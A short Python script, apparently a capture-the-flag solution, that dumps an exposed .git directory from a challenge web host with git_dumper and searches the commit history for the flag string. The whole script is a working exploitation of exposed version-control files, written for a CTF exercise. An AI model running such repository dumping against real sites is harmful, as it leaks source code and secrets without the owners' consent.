import os
from git_dumper import fetch_git
import subprocess
import shutil

hostname = "https://commit.chall.trojanc.tf"

if os.path.isdir('git'):
    shutil.rmtree('git')

os.mkdir("git")

fetch_git(f"{hostname}/.git", "git", 10, 3, 3, {})

command = "git log -p -S Trojan | grep Trojan"
result = subprocess.check_output(command, shell=True, text=True)
print(result)
